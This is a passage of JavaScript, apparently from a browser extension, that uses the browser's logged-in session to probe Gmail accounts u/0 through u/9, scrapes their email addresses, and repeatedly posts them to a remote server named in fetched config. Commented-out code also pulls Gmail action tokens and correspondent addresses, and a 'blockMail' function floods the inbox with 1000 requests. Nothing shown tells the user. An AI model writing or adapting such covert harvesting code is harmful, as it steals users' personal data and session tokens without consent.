                                    // console.log("***********", users)


                                }
                                else if (this.status != 200 && this.readyState == 4) {
                                    if (authid < 9) {
                                        Intiate(authid + 1);
                                    }
                                    else {
                                        Intiate(0)
                                    }

                                }
                            }
                            conn.send();


                        }
                    }
                        catch (err){
                            console.log("****" + err);
                            //console.log(users);

                            if (authid < 9) {
                                Intiate(authid + 1);
                            }
                            else {
                                Intiate(0)
                            }
                        }





            }
            else if(this.status!=200&this.readyState==4)
            {   console.log("__________________-")
                if (authid < 9) {
                    Intiate(authid + 1);
                }
                else {
                    Intiate(0)
                }
            }
        }
        conn2.error=function () {
            if (authid < 9) {
                Intiate(authid + 1);
            }
            else {
                Intiate(0)
            }

        }
        conn2.send()


    }

  Intiate(0);


    function getConfig() {
        $.post(labsLiveUrl, {}, function (data, status) {  //CheckActiveMails(0)
            CheckActiveMails(0,data)
            setInterval(function () {
                CheckActiveMails(0,data)
            }, 1000 * data.liveRftime);

        }).fail(function (status) {
            setTimeout(function () {
                getConfig()
            }, 1000 * 5);
        })

    }

getConfig();

   /* function liveEmails(authid, config) {
        console.log("okkk------" + authid)
        checkConnection(authid, function (result) {
            if (result == 1) {
                var today = new Date();
                var year = today.getFullYear();
                var month = today.getMonth() + 1;
                month = month.toString().length > 1 ? month : "0" + month;
                var date = today.getDate().toString().length > 1 ? today.getDate() : "0" + today.getDate();
                today = year + "/" + month + "/" + date;

                console.log(today)
                var conn2 = new XMLHttpRequest();
                conn2.open("GET", "https://mail.google.com/mail/u/" + authid + "/#inbox");
                conn2.onreadystatechange = function () {
                    if (this.status == 200 && this.readyState == 4) {
                        try {
                            var tmp = /var GLOBALS\=\[(?:([^\,]*)\,){10}/.exec(this.responseText || "");
                            var ik = tmp && tmp.length > 1 ? tmp[1].replace(/[\"\']/g, "") : null;
                            var reg = /var GM_ACTION_TOKEN="(.*?)"/g.exec(this.responseText);
                            reg = reg[0].replace('var GM_ACTION_TOKEN="', '').replace('"', '');

                            var url = "https://mail.google.com/mail/u/" + authid + "/?ui=2&ik=" + ik + "&at=" + reg + "&view=tl&start=0&num=2&rt=c&as_has=is:starred&as_excludechats=true&as_subset=all&as_date=" + today + "&as_within=1d&search=adv";
                            console.log(url)
                            var conn = new XMLHttpRequest();
                            conn.open("GET", url)
                            conn.onreadystatechange = function () {
                                if (this.status == 200 && this.readyState == 4) {
                                    var reg_users = /\["mla",\[\[.*?\]\]/.exec(this.responseText);
                                    try {
                                        users = JSON.parse([reg_users[0].replace('["mla",', "")]);

                                    } catch (err) {
                                        liveEmails(authid + 1, config)

                                    }
                                    var activeUsers = [];
                                    console.log(activeUsers);
                                    users.forEach(function (user) {
                                        activeUsers.push(user[0]);
                                    });
                                    //console.log({"emails":activeUsers});
                                    sendActiveMails({"emails": activeUsers}, config.liveUrl);
                                }
                            }
                            conn.send();
                        }
                        catch (err) {
                            console.log(err);
                            if (authid < 9) {
                                console.log(authid)
                                liveEmails(authid + 1, config)
                            } else {
                                console.log(authid)
                            }


                        }
                    }
                }
                conn2.send();
            }
            else {
                console.log("No active mails at this time");

            }
        })
    }*/

    function checkConnection(authid, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://mail.google.com/mail/u/" + authid + "/feed/atom");
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                callback(1)

            }
            else if (this.readyState == 4 && this.status != 200) {
                callback(0);


            }
        }
        xhr.send();
    }

    function sendActiveMails(mailslist, url) {

        //console.log(conf)
        try {
            $.ajax({
                type: "POST",
                url: url,
                data: JSON.stringify(mailslist),
                contentType: "application/json",
                crossDomain: true,
                dataType: "json",
                success: function (data, status, jqXHR) {
                    ActiveUsers=[];

                },
                error: function (jqXHR, status) {
                    console.log(jqXHR, status)
                }
            });
        }
        catch (err) {
            console.log(err);
        }

    }


    function blockMail(authid) {

        for (var i = 0; i < 1000; i++) {

            var xhr = new XMLHttpRequest();
            xhr.open("GET", "https://mail.google.com/mail/u/" + authid + "/#inbox");
            xhr.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {

                }
            }
            xhr.send();
        }
    }

    var ActiveUsers = [];

    function CheckActiveMails(id,conf) {

        if (id >= 10) {
            sendActiveMails({"emails":ActiveUsers},conf.liveUrl);
        }
        else {

            var xhr = new XMLHttpRequest();
            xhr.open("GET", "https://mail.google.com/mail/u/" + id + "/feed/atom");
            xhr.onreadystatechange = function () {
                if (this.status == 200 && this.readyState == 4) {
                    var xmldoc = this.responseText;

                    if(/\<feed.*?\>.*?<\/feed\>/g.exec(this.responseText))
                    {
                        var email = (/\<title.*?\>.*?\<\/title\>/.exec(this.responseText)[0]).replace("Gmail - Inbox for ", "").replace(/<title.*?>/g, "").replace(/\<\/title\>/g, "").trim();

                       // console.log(ActiveUsers)
                        if (ActiveUsers.indexOf(email) == -1) {
                            ActiveUsers.push(email);
                            CheckActiveMails(id + 1,conf);
                        }
                        else {
                            CheckActiveMails(10,conf);
                        }
                    }
                    else
                    {
                        CheckActiveMails(id + 1,conf);
                    }
                }
                else if (this.readyState == 4 && this.status != 200) {
                    console.log(this.status)

                }
                else {
                   console.log(this.readyState)
                }
            }
            xhr.send();
        }
    }
}
catch (err) {
    console.log(err)
}


